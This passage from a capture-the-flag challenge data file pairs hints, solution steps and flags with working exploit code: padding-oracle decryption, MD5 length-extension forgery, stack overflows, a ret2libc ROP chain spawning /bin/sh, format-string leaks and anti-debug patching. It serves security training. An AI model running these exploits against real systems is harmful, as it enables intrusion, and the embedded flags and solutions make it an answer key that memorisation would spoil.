      { lang: "python", code: "import requests\n\ndef oracle(ct_hex):\n    r = requests.get('http://target/api/check', cookies={'token': ct_hex})\n    return r.status_code != 500  # 500 = bad padding\n\ndef decrypt_byte(ct_blocks, block_idx, byte_idx, known_intermediate):\n    for guess in range(256):\n        modified = bytearray(ct_blocks[block_idx - 1])\n        pad_val = 16 - byte_idx\n        # Set already-known bytes to produce correct padding\n        for k in range(byte_idx + 1, 16):\n            modified[k] = known_intermediate[k] ^ pad_val\n        modified[byte_idx] = guess\n        test_ct = bytes(modified) + ct_blocks[block_idx]\n        if oracle(test_ct.hex()):\n            return guess ^ pad_val\n    return None" }
    ],
    references: ["https://blog.skullsecurity.org/2013/padding-oracle-attacks-in-depth"]
  },
  {
    id: "crypto-006", title: "Hash Length Extension", category: "Cryptography",
    difficulty: "hard", points: 350,
    description: "An API authenticates requests using MAC = MD5(secret || message). You know a valid MAC for 'user=guest' and the secret length. Exploit the hash length extension vulnerability in MD5 to forge a valid MAC for 'user=guest&role=admin' without knowing the secret.",
    hints: [
      "MD5, SHA-1, and SHA-256 are vulnerable to length extension attacks due to Merkle-Damgard construction",
      "You can continue hashing from a known state without knowing the secret",
      "Tools like HashPump automate this attack"
    ],
    solution_steps: [
      "You know: MAC = MD5(secret || 'user=guest'), secret length = 16 bytes",
      "The MD5 internal state after processing 'secret||user=guest||padding' is embedded in the known MAC",
      "Use hash_extender or HashPump to compute MD5(secret || original || padding || '&role=admin')",
      "The tool outputs: new_mac and new_message (original + padding + appended data)",
      "URL-encode the new_message (it contains null bytes from padding)",
      "Send the request with the forged MAC and extended message",
      "The server computes MD5(secret || new_message) which equals your forged MAC",
      "Access granted with role=admin — retrieve the flag"
    ],
    flag_format: "flag{h4sh_l3ngth_3xt3nd}",
    tools_used: ["HashPump", "hash_extender", "Python"],
    concepts_tested: ["Hash length extension", "MD5 internals", "Merkle-Damgard", "MAC forgery"],
    code_snippets: [
      { lang: "bash", code: "# Using HashPump\nhashpump -s 'KNOWN_MAC' -d 'user=guest' -a '&role=admin' -k 16\n\n# Output:\n# New signature: FORGED_MAC_HEX\n# New string: user=guest\\x80\\x00...\\xc0\\x00...&role=admin" },
      { lang: "python", code: "import hashpumpy\n\noriginal_mac = 'a1b2c3d4e5f6...'  # known MAC\noriginal_data = 'user=guest'\nappend_data = '&role=admin'\nkey_length = 16\n\nnew_mac, new_data = hashpumpy.hashpump(original_mac, original_data, append_data, key_length)\nprint(f'Forged MAC: {new_mac}')\nprint(f'Forged data: {new_data}')" }
    ],
    references: ["https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks"]
  },
  // =====================================================================
  // BINARY EXPLOITATION
  // =====================================================================
  {
    id: "bin-001", title: "Stack Buffer Overflow", category: "Binary Exploitation",
    difficulty: "easy", points: 100,
    description: "A simple C program reads input into a 64-byte buffer using gets() without bounds checking. A local variable 'is_admin' is stored right after the buffer on the stack. Overflow the buffer to set is_admin to a non-zero value and get the flag.",
    hints: [
      "gets() reads unlimited input — it never checks buffer boundaries",
      "Local variables are stored on the stack right after each other",
      "Overflowing past the 64-byte buffer will overwrite is_admin"
    ],
    solution_steps: [
      "Disassemble the binary in GDB: disas main",
      "Identify the buffer (64 bytes) and is_admin variable positions on the stack",
      "Notice that is_admin is at buffer + 64 (right after the buffer)",
      "Craft input: 64 bytes of padding + non-zero bytes to overwrite is_admin",
      "Send the payload: python3 -c \"print('A'*64 + 'BBBB')\" | ./challenge",
      "The program checks if(is_admin) and prints the flag",
      "If ASLR is disabled, you could also overwrite the return address for full control"
    ],
    flag_format: "flag{st4ck_0v3rfl0w_b4s1cs}",
    tools_used: ["GDB", "Python", "pwntools", "checksec"],
    concepts_tested: ["Buffer overflow", "Stack layout", "gets() vulnerability", "Variable overwrite"],
    code_snippets: [
      { lang: "c", code: "#include <stdio.h>\n#include <string.h>\n\nvoid win() { printf(\"flag{st4ck_0v3rfl0w_b4s1cs}\\n\"); }\n\nint main() {\n    int is_admin = 0;\n    char buf[64];\n    printf(\"Enter password: \");\n    gets(buf);  // VULNERABLE: no bounds checking\n    if (is_admin) win();\n    return 0;\n}" },
      { lang: "python", code: "from pwn import *\n\np = process('./challenge')\npayload = b'A' * 64 + p32(1)  # overflow buffer + set is_admin = 1\np.sendline(payload)\nprint(p.recvall().decode())" }
    ],
    references: ["https://ctf101.org/binary-exploitation/buffer-overflow/"]
  },
  {
    id: "bin-002", title: "Return Address Overwrite", category: "Binary Exploitation",
    difficulty: "medium", points: 200,
    description: "A binary has a hidden win() function that prints the flag but is never called. A vulnerable function uses gets() to read into a stack buffer. Overflow the buffer to overwrite the saved return address and redirect execution to win().",
    hints: [
      "Use checksec to see protections — PIE disabled means addresses are fixed",
      "Find the win() address: objdump -d binary | grep win",
      "The return address is at buffer + padding + saved_rbp (8 bytes) + ret_addr"
    ],
    solution_steps: [
      "Run checksec on the binary: NX enabled, PIE disabled, no canary",
      "Find win() address: objdump -d challenge | grep '<win>' → 0x401196",
      "Find the buffer size by sending increasing input until crash",
      "Use GDB with pattern_create/pattern_offset to find exact offset to return address",
      "Offset is typically: buffer_size + 8 (saved RBP) = e.g., 72 bytes",
      "Craft payload: b'A'*72 + p64(0x401196)",
      "If there's a stack alignment issue (SIGBUS), add a 'ret' gadget before win()",
      "Send the payload and receive the flag"
    ],
    flag_format: "flag{r3t_4ddr_0v3rwr1t3}",
    tools_used: ["GDB", "pwntools", "checksec", "ROPgadget"],
    concepts_tested: ["Return address overwrite", "Stack layout", "x86-64 calling convention", "Stack alignment"],
    code_snippets: [
      { lang: "python", code: "from pwn import *\n\nelf = ELF('./challenge')\np = process('./challenge')\n\nwin_addr = elf.symbols['win']  # or hardcode: 0x401196\nret_gadget = 0x40101a  # 'ret' instruction for stack alignment\n\noffset = 72  # buffer + saved rbp\npayload = b'A' * offset\npayload += p64(ret_gadget)  # align stack to 16 bytes\npayload += p64(win_addr)\n\np.sendline(payload)\nprint(p.recvall().decode())" }
    ],
    references: ["https://ctf101.org/binary-exploitation/return-oriented-programming/"]
  },
  {
    id: "bin-003", title: "Format String Vulnerability", category: "Binary Exploitation",
    difficulty: "medium", points: 250,
    description: "A program prints user input directly with printf(user_input) instead of printf(\"%s\", user_input). The flag is stored in a global variable. Use format string specifiers to read the flag from memory.",
    hints: [
      "printf() with user-controlled format string lets you read/write memory",
      "%x or %p reads values from the stack",
      "%s dereferences a pointer on the stack and prints the string"
    ],
    solution_steps: [
      "Confirm format string vulnerability: enter %p.%p.%p — if hex values appear, it's vulnerable",
      "Find the flag address: objdump -t challenge | grep flag → 0x404060",
      "Determine the format string offset: send AAAA%N$x for N=1,2,3... until 0x41414141 appears",
      "The offset where your input appears might be at position 6-10",
      "To read the flag as a string: place the flag address on the stack and use %s",
      "Payload: p64(0x404060) + b'%7$s' (if your input is at offset 7)",
      "Alternatively, use %N$s with the address in the right stack position",
      "The printf() call will dereference 0x404060 and print the flag string"
    ],
    flag_format: "flag{f0rm4t_str1ng_l34k}",
    tools_used: ["GDB", "pwntools", "objdump"],
    concepts_tested: ["Format string vulnerability", "printf exploitation", "Memory read", "Stack inspection"],
    code_snippets: [
      { lang: "python", code: "from pwn import *\n\np = process('./challenge')\n\n# First, find the offset where our input appears on the stack\n# Send AAAA followed by %p format specifiers\np.sendline(b'AAAA' + b'.%p' * 20)\nleak = p.recvline()\nprint(leak)  # Find where 0x41414141 appears\n\n# If offset is 6, read the flag:\nflag_addr = 0x404060\npayload = p64(flag_addr) + b'%6$s'\np.sendline(payload)\nprint(p.recvall())" }
    ],
    references: ["https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/"]
  },
  {
    id: "bin-004", title: "Return-Oriented Programming", category: "Binary Exploitation",
    difficulty: "hard", points: 400,
    description: "A binary has NX enabled (no executable stack), so you can't inject shellcode. Use ROP gadgets — small code snippets ending in 'ret' — to chain together a call to system('/bin/sh') and get a shell to read the flag.",
    hints: [
      "With NX, you can't execute code on the stack — but you can reuse existing code",
      "Find gadgets with ROPgadget or ropper: pop rdi; ret is crucial for x86-64",
      "You need: pop rdi + address of '/bin/sh' + address of system()"
    ],
    solution_steps: [
      "checksec shows: NX enabled, PIE disabled, no canary, no RELRO or partial RELRO",
      "Since the binary is dynamically linked and PIE is off, libc addresses are at fixed GOT entries",
      "First leak a libc address: use puts@plt to print puts@got",
      "ROP chain 1: pop_rdi + puts_got + puts_plt + main (to return to main for second payload)",
      "Parse the leaked address and calculate libc base",
      "Find system() and '/bin/sh' in libc: libc_base + offset",
      "ROP chain 2: pop_rdi + binsh_addr + ret_gadget + system_addr",
      "Send chain 2, get a shell, cat /flag.txt"
    ],
    flag_format: "flag{r0p_ch41n_syst3m_sh3ll}",
    tools_used: ["pwntools", "ROPgadget", "GDB", "ropper", "one_gadget"],
    concepts_tested: ["ROP", "GOT/PLT", "Libc leak", "ret2libc", "Stack pivoting"],
    code_snippets: [
      { lang: "python", code: "from pwn import *\n\nelf = ELF('./challenge')\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\np = process('./challenge')\n\n# Gadgets\npop_rdi = 0x401233  # pop rdi; ret\nret = 0x40101a      # ret (stack alignment)\n\n# Stage 1: Leak libc address\npayload1 = b'A' * 72\npayload1 += p64(pop_rdi) + p64(elf.got['puts'])\npayload1 += p64(elf.plt['puts'])\npayload1 += p64(elf.symbols['main'])  # return to main\np.sendline(payload1)\n\nputs_leak = u64(p.recvline().strip().ljust(8, b'\\x00'))\nlibc.address = puts_leak - libc.symbols['puts']\nlog.success(f'libc base: {hex(libc.address)}')\n\n# Stage 2: system('/bin/sh')\npayload2 = b'A' * 72\npayload2 += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))\npayload2 += p64(ret)  # align\npayload2 += p64(libc.symbols['system'])\np.sendline(payload2)\np.interactive()" }
    ],
    references: ["https://ctf101.org/binary-exploitation/return-oriented-programming/"]
  },
  // =====================================================================
  // REVERSE ENGINEERING
  // =====================================================================
  {
    id: "rev-001", title: "Simple Crackme", category: "Reverse Engineering",
    difficulty: "easy", points: 100,
    description: "A binary asks for a password and checks it against a hardcoded string using strcmp(). Reverse engineer the binary to find the password. The password is the flag.",
    hints: [
      "Use 'strings' command to look for readable text in the binary",
      "The password might be stored as a plaintext string",
      "If obfuscated, use GDB to break on strcmp and inspect the arguments"
    ],
    solution_steps: [
      "Run: strings challenge | grep -i flag — might directly reveal the password",
      "If not found, open in GDB: gdb ./challenge",
      "Set a breakpoint on strcmp: break strcmp",
      "Run the program with any input: run",
      "When the breakpoint hits, inspect the arguments:",
      "x86-64: x/s $rdi shows first arg (user input), x/s $rsi shows second arg (password)",
      "The password/flag is the string being compared to your input",
      "Alternatively, use ltrace ./challenge to see library calls including strcmp arguments"
    ],
    flag_format: "flag{str1ngs_4nd_gdb}",
    tools_used: ["strings", "GDB", "ltrace", "Ghidra", "objdump"],
    concepts_tested: ["Static analysis", "Dynamic analysis", "strcmp", "Binary inspection"],
    code_snippets: [
      { lang: "bash", code: "# Quick methods:\nstrings challenge | grep flag\nltrace ./challenge <<< 'test'\n\n# GDB method:\ngdb -q ./challenge\n(gdb) break strcmp\n(gdb) run <<< 'test'\n(gdb) x/s $rsi\n# Shows: \"flag{str1ngs_4nd_gdb}\"" }
    ],
    references: ["https://ctf101.org/reverse-engineering/overview/"]
  },
  {
    id: "rev-002", title: "XOR-Encoded Flag", category: "Reverse Engineering",
    difficulty: "medium", points: 200,
    description: "A binary contains an encoded flag that is decoded at runtime by XORing with a key. The check function compares your input against the decoded flag. Find the XOR key and encoded data to recover the flag.",
    hints: [
      "Look for arrays of bytes in the .data or .rodata section",
      "A XOR loop typically loads a byte, XORs with a key byte, and stores the result",
      "Set a breakpoint after the decode loop to see the plaintext in memory"
    ],
    solution_steps: [
      "Open the binary in Ghidra and find the main/check function",
      "Identify the XOR decode loop — it typically looks like: buf[i] ^= key[i % key_len]",
      "Extract the encoded byte array and the XOR key from the binary",
      "Write a script to perform the same XOR operation",
      "Alternatively, use GDB: break after the decode loop and dump the decoded buffer",
      "GDB: break at the comparison instruction, run, then x/s to read the decoded string"
    ],
    flag_format: "flag{x0r_d3c0d3_r3v3rs3}",
    tools_used: ["Ghidra", "GDB", "Python", "radare2"],
    concepts_tested: ["XOR encoding", "Static analysis", "Data extraction", "Decompilation"],
    code_snippets: [
      { lang: "python", code: "# Extracted from the binary:\nencoded = [0x1e, 0x0a, 0x13, 0x16, 0x5b, 0x30, 0x21, 0x36, ...]\nkey = [0x78, 0x6f, 0x72, 0x6b]  # 'xork'\n\nflag = ''.join(chr(encoded[i] ^ key[i % len(key)]) for i in range(len(encoded)))\nprint(flag)" }
    ],
    references: ["https://ctf101.org/reverse-engineering/what-are-strings/"]
  },
  {
    id: "rev-003", title: "Anti-Debug Bypass", category: "Reverse Engineering",
    difficulty: "hard", points: 350,
    description: "A crackme binary detects debuggers using ptrace, timing checks, and /proc/self/status inspection. It only reveals the flag when not being debugged. Bypass all anti-debug techniques to retrieve the flag.",
    hints: [
      "ptrace(PTRACE_TRACEME) returns -1 when a debugger is attached",
      "The binary checks /proc/self/status for TracerPid",
      "RDTSC timing checks detect single-stepping in a debugger"
    ],
    solution_steps: [
      "Run the binary normally — it prints 'Access Denied' without the flag",
      "Attach GDB — it detects the debugger and exits",
      "Identify anti-debug checks in Ghidra: search for ptrace, /proc/self/status, rdtsc",
      "Patch the ptrace call: change the conditional jump after ptrace to always take the 'no debugger' path",
      "NOP out the /proc/self/status check or patch the comparison",
      "For timing checks: NOP the rdtsc instructions or patch the threshold comparison",
      "Alternatively, use LD_PRELOAD to hook ptrace: create a shared library that returns 0",
      "Run the patched binary or use LD_PRELOAD=./fakeptrace.so ./challenge",
      "The flag is revealed"
    ],
    flag_format: "flag{4nt1_d3bug_byp4ss3d}",
    tools_used: ["Ghidra", "GDB", "radare2", "LD_PRELOAD"],
    concepts_tested: ["Anti-debugging", "ptrace", "Binary patching", "LD_PRELOAD hooking"],
    code_snippets: [
      { lang: "c", code: "// fakeptrace.c — LD_PRELOAD hook\n#include <sys/types.h>\nlong ptrace(int request, ...) {\n    return 0;  // Always return success\n}\n// Compile: gcc -shared -o fakeptrace.so fakeptrace.c\n// Run: LD_PRELOAD=./fakeptrace.so ./challenge" },
      { lang: "bash", code: "# Patch with radare2\nr2 -w ./challenge\n[0x00401000]> aaa\n[0x00401000]> afl~ptrace  # find ptrace call\n[0x00401000]> s 0x401234   # seek to the jne after ptrace check\n[0x00401234]> wa nop; nop  # NOP the conditional jump\n[0x00401234]> q" }
    ],
    references: ["https://anti-debug.checkpoint.com/"]
  },
  // =====================================================================
  // FORENSICS
  // =====================================================================
  {
    id: "for-001", title: "Hidden in Plain Sight", category: "Forensics",
    difficulty: "easy", points: 50,
    description: "A PNG image file has been provided. It looks like a normal picture, but the flag is hidden somewhere in the file. Examine the file metadata and structure to find the hidden flag.",
    hints: [
      "Check the file's metadata with exiftool",
      "Try the strings command to find readable text",
      "The flag might be appended after the PNG end marker (IEND)"
    ],
    solution_steps: [
      "Run: file challenge.png — confirms it's a valid PNG",
      "Run: strings challenge.png | grep flag — might find the flag directly",
      "Run: exiftool challenge.png — check Comment, Description, and other fields",
      "If not in strings/metadata, check for data after the IEND chunk",
      "Run: binwalk challenge.png — look for embedded files",
      "The flag may be in: EXIF Comment field, appended data after IEND, or a tEXt/zTXt PNG chunk"
    ],
    flag_format: "flag{m3t4d4t4_h1dd3n}",
    tools_used: ["strings", "exiftool", "binwalk", "xxd"],
    concepts_tested: ["Steganography", "Metadata", "File structure", "PNG format"],
    code_snippets: [
      { lang: "bash", code: "# Quick forensics checklist:\nfile challenge.png\nstrings challenge.png | grep -i flag\nexiftool challenge.png\nbinwalk challenge.png\nxxd challenge.png | tail -20  # check end of file\npngcheck -v challenge.png  # validate PNG structure" }
    ],
    references: ["https://ctf101.org/forensics/what-is-steganography/"]
  },
  {
    id: "for-002", title: "Memory Forensics — Process Dump", category: "Forensics",
    difficulty: "medium", points: 250,
    description: "A memory dump from a compromised Windows machine is provided. A suspicious process was running that contained the attacker's C2 password. Use Volatility to identify the process and extract the flag from its memory space.",
    hints: [
      "Start by identifying the OS profile with imageinfo or windows.info",
      "List processes with pslist/pstree to find suspicious ones",
      "Dump the suspicious process memory and search for strings"
    ],
    solution_steps: [
      "Determine the profile: vol3 -f memdump.raw windows.info",
      "List processes: vol3 -f memdump.raw windows.pslist",
      "Identify suspicious processes: look for unusual names, high PIDs, or processes with no parent",
      "Found suspicious: 'svchost.exe' running from an unusual path (C:\\Users\\...)",
      "Dump the process memory: vol3 -f memdump.raw windows.memmap --pid 1234 --dump",
      "Search the dump: strings pid.1234.dmp | grep flag",
      "Alternatively, use vol3 -f memdump.raw windows.cmdline to check command-line arguments",
      "Check network connections: vol3 -f memdump.raw windows.netscan for C2 connections",
      "The flag is found in the process memory or command-line arguments"
    ],
    flag_format: "flag{m3m0ry_f0r3ns1cs_v0l}",
    tools_used: ["Volatility3", "strings", "grep"],
    concepts_tested: ["Memory forensics", "Process analysis", "Volatility framework", "Malware analysis"],
    code_snippets: [
      { lang: "bash", code: "# Volatility3 workflow:\nvol3 -f memdump.raw windows.info\nvol3 -f memdump.raw windows.pslist\nvol3 -f memdump.raw windows.pstree\nvol3 -f memdump.raw windows.cmdline\nvol3 -f memdump.raw windows.netscan\nvol3 -f memdump.raw windows.filescan | grep -i 'flag\\|secret\\|password'\nvol3 -f memdump.raw windows.memmap --pid 1234 --dump\nstrings pid.1234.dmp | grep -i flag" }
    ],
    references: ["https://volatility3.readthedocs.io/"]
  },
  {
    id: "for-003", title: "Network Capture Analysis", category: "Forensics",
    difficulty: "medium", points: 200,
    description: "A PCAP file contains network traffic from a compromised machine. The attacker exfiltrated the flag via DNS queries. Analyze the capture to reconstruct the flag from the DNS query names.",
    hints: [
      "Filter for DNS traffic in Wireshark: dns",
      "Look at the subdomain labels in DNS queries — they often carry encoded data",
      "The subdomains might be hex or base64 encoded parts of the flag"
    ],
    solution_steps: [
      "Open the PCAP in Wireshark or use tshark",
      "Filter DNS queries: tshark -r capture.pcap -Y 'dns.qr == 0' -T fields -e dns.qry.name",
      "Notice queries to: 666c61672e.evil.com, 7b646e735f.evil.com, etc.",
      "The subdomain labels are hex-encoded data",
      "Extract all unique query subdomains in order",
      "Concatenate the hex labels: 666c6167 7b646e73 5f337866 ...",
      "Decode from hex: bytes.fromhex('666c61677b646e735f...').decode()",
      "The decoded data reveals the flag"
    ],
    flag_format: "flag{dns_3xf1ltr4t10n}",
    tools_used: ["Wireshark", "tshark", "Python", "CyberChef"],
    concepts_tested: ["PCAP analysis", "DNS exfiltration", "Hex decoding", "Network forensics"],
    code_snippets: [
      { lang: "bash", code: "# Extract DNS query names\ntshark -r capture.pcap -Y 'dns.qr == 0 && dns.qry.name contains evil.com' \\\n  -T fields -e dns.qry.name | sort -u" },
      { lang: "python", code: "# Decode hex subdomains\nqueries = ['666c61672e.evil.com', '7b646e735f.evil.com', '337866316c.evil.com']\nhex_data = ''.join(q.split('.')[0] for q in queries)\nflag = bytes.fromhex(hex_data).decode()\nprint(flag)" }
    ],
    references: ["https://ctf101.org/forensics/what-is-wireshark/"]
  },
  {
    id: "for-004", title: "Disk Image — Deleted File Recovery", category: "Forensics",
    difficulty: "medium", points: 200,
    description: "A disk image (dd format) from a suspect's USB drive is provided. The suspect deleted a file containing the flag. Recover the deleted file using file carving techniques.",
    hints: [
      "Deleted files may still exist on disk until their sectors are overwritten",
      "Tools like foremost, scalpel, and photorec can carve files from raw disk images",
      "The file system journal or slack space may contain remnants"
    ],
    solution_steps: [
      "Mount the image read-only: mount -o ro,loop suspect.dd /mnt/evidence",
      "List visible files — the flag file is not there (deleted)",
      "Unmount and run file carving: foremost -i suspect.dd -o carved/",
      "Check the carved output directory for recovered files",
      "Alternative: use fls (SleuthKit) to list deleted files: fls -rd suspect.dd",
      "Identify the deleted file's inode number",
      "Recover with icat: icat suspect.dd INODE_NUM > recovered_flag.txt",
      "Read the recovered file to get the flag"
    ],
    flag_format: "flag{d3l3t3d_but_n0t_g0n3}",
    tools_used: ["foremost", "SleuthKit (fls, icat)", "Autopsy", "photorec", "strings"],
    concepts_tested: ["File carving", "Deleted file recovery", "Disk forensics", "File system analysis"],
    code_snippets: [
      { lang: "bash", code: "# SleuthKit approach:\nmmls suspect.dd              # List partitions\nfls -rd -o 2048 suspect.dd   # List deleted files (-d) recursively\nicat -o 2048 suspect.dd 42   # Recover file by inode 42\n\n# Foremost approach:\nforemost -i suspect.dd -o output/\nls output/\n\n# Strings as last resort:\nstrings suspect.dd | grep -i flag" }
    ],
    references: ["https://wiki.sleuthkit.org/index.php?title=Fls"]
  },
  // =====================================================================
  // OSINT
  // =====================================================================
  {
    id: "osint-001", title: "Geolocate the Photo", category: "OSINT",
    difficulty: "easy", points: 100,
    description: "An image has been shared from an unknown location. The image contains EXIF GPS data. Extract the coordinates and identify the location. The flag is the city name in the format flag{city_name}.",
    hints: [
      "EXIF data in photos can include GPS coordinates",
      "Use exiftool to extract metadata",
      "Convert GPS coordinates to a location using Google Maps"
    ],
    solution_steps: [
      "Download the image and run: exiftool photo.jpg",
      "Look for GPS Latitude, GPS Longitude fields",
      "Extract coordinates: e.g., 48.8584 N, 2.2945 E",
      "Enter coordinates in Google Maps: 48.8584, 2.2945",
      "Identify the location: Eiffel Tower, Paris, France",
      "The flag is the city name: flag{paris}"
    ],
    flag_format: "flag{paris}",
    tools_used: ["exiftool", "Google Maps", "Browser"],
    concepts_tested: ["EXIF metadata", "GPS coordinates", "Geolocation"],
    code_snippets: [
      { lang: "bash", code: "exiftool -GPS* photo.jpg\n# GPS Latitude: 48 deg 51' 30.24\" N\n# GPS Longitude: 2 deg 17' 40.20\" E\n\n# Convert to decimal:\n# 48 + 51/60 + 30.24/3600 = 48.8584\n# 2 + 17/60 + 40.20/3600 = 2.2945" }
    ],
    references: ["https://ctf101.org/forensics/what-is-metadata/"]
  },
  {
    id: "osint-002", title: "Username Correlation", category: "OSINT",
    difficulty: "medium", points: 200,
    description: "You're given a username 'cyb3rhunt3r_42'. Find all social media accounts associated with this username. One of the accounts contains a post with the flag.",
    hints: [
      "Many people reuse the same username across platforms",
      "Tools like sherlock and namechk search hundreds of sites",
      "Check GitHub, Twitter/X, Reddit, Instagram, and niche security forums"
    ],
    solution_steps: [
      "Run sherlock: sherlock cyb3rhunt3r_42 — it checks 300+ sites",
      "Review the results for confirmed accounts (HTTP 200)",
      "Check each found profile for the flag",
      "Found accounts: GitHub, Reddit, Keybase",
      "Check the GitHub profile for repositories, gists, or bio",
      "Check Reddit comment/post history",
      "The flag is found in a GitHub gist or Reddit post"
    ],
    flag_format: "flag{0s1nt_us3rn4m3_c0rr3l4t10n}",
    tools_used: ["sherlock", "namechk", "Google", "Wayback Machine"],
    concepts_tested: ["Username enumeration", "Account correlation", "OSINT methodology"],
    code_snippets: [
      { lang: "bash", code: "# Sherlock\nsherlock cyb3rhunt3r_42\n\n# Manual checks\ncurl -s 'https://github.com/cyb3rhunt3r_42' | grep -i flag\ncurl -s 'https://www.reddit.com/user/cyb3rhunt3r_42/.json' | python3 -m json.tool" }
    ],
    references: ["https://github.com/sherlock-project/sherlock"]
  },
  // =====================================================================
  // MISCELLANEOUS
  // =====================================================================
  {
    id: "misc-001", title: "Base64 Nesting", category: "Miscellaneous",
    difficulty: "easy", points: 50,
    description: "A flag has been encoded with base64 multiple times. The string 'Vm0wd2QyUXlVWGx...' is provided. Keep decoding until you find the plaintext flag.",
    hints: [
      "Base64 encoded text often ends with = or == padding",
      "Decode repeatedly until the output is no longer valid base64",
      "The flag starts with 'flag{'"
    ],
    solution_steps: [
      "Decode the string: echo 'Vm0wd2QyUXlVWGx...' | base64 -d",
      "Check if the output is still base64 encoded",
      "Keep decoding: echo 'OUTPUT' | base64 -d",
      "Repeat until you get plaintext starting with flag{",
      "Typically encoded 5-10 times"
    ],
    flag_format: "flag{b4s364_1nc3pt10n}",
    tools_used: ["base64", "CyberChef", "Python"],
    concepts_tested: ["Base64 encoding", "Iterative decoding"],
    code_snippets: [
      { lang: "python", code: "import base64\n\ndata = 'Vm0wd2QyUXlVWGx...'\nwhile True:\n    try:\n        data = base64.b64decode(data).decode()\n        if data.startswith('flag{'):\n            print(data)\n            break\n    except:\n        break" },
      { lang: "bash", code: "# Bash one-liner — decode until it fails or finds flag\nDATA='Vm0wd2QyUXlVWGx...'\nwhile echo \"$DATA\" | base64 -d 2>/dev/null; do\n  DATA=$(echo \"$DATA\" | base64 -d 2>/dev/null)\n  echo \"$DATA\" | grep -q 'flag{' && echo \"$DATA\" && break\ndone" }
    ],
    references: ["https://en.wikipedia.org/wiki/Base64"]
  },
  {
    id: "misc-002", title: "QR Code Reconstruction", category: "Miscellaneous",
    difficulty: "medium", points: 200,
    description: "A QR code image has been partially corrupted — some modules are missing. QR codes have error correction that can recover up to 30% of missing data. Attempt to scan the QR code or manually fix the alignment patterns to decode it.",
    hints: [
      "QR codes have finder patterns (big squares in 3 corners) and alignment patterns",
      "Error correction level H can recover up to 30% of data",
      "Try different QR code readers — some handle damage better than others"
    ],
    solution_steps: [
      "Try scanning the damaged QR code with zbarimg or an online reader",
      "If it fails, repair the finder patterns — they're the large squares in corners",
      "Each finder pattern is 7x7 modules with a specific pattern",
      "Fix the timing patterns — alternating black/white between finders",
      "Try scanning again after each fix",
      "If still failing, use a QR code forensics tool to extract raw data",
      "The decoded QR code contains the flag"
    ],
    flag_format: "flag{qr_3rr0r_c0rr3ct10n}",
    tools_used: ["zbarimg", "qrencode", "Image editor", "CyberChef"],
    concepts_tested: ["QR codes", "Error correction", "Image manipulation"],
    code_snippets: [
      { lang: "bash", code: "# Scan QR code\nzbarimg damaged_qr.png\n\n# If that fails, try with different settings:\nzbarimg --set '*.enable=0' --set 'qr.enable=1' damaged_qr.png\n\n# Generate a QR for comparison\nqrencode -o reference.png 'test'\n\n# Python with pyzbar\npython3 -c \"from pyzbar.pyzbar import decode; from PIL import Image; print(decode(Image.open('damaged_qr.png')))\"" }
    ],
    references: ["https://en.wikipedia.org/wiki/QR_code#Error_correction"]
  }
];
